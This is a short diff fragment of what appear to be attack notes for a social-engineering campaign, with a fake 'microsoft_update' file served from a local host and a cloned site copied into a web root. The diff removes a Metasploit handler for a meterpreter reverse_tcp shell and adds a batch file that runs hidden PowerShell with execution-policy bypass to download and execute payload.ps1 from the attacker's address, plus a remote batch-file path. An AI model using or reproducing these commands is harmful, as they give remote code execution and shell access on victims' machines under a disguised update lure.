@@ -21,13 +21,11 @@ http://192.168.1.137:8080/microsoft_update.page.zip
 
 sudo cp -r /caminho/para/conectasocial_advanced /var/www/html/
 
-use exploit/multi/handler
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST 192.168.1.137
-set LPORT 4444
-run
+@echo off
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.137/payload.ps1')"
 
 
+\\192.168.1.137\compartilhado\executar.bat
 
 
 
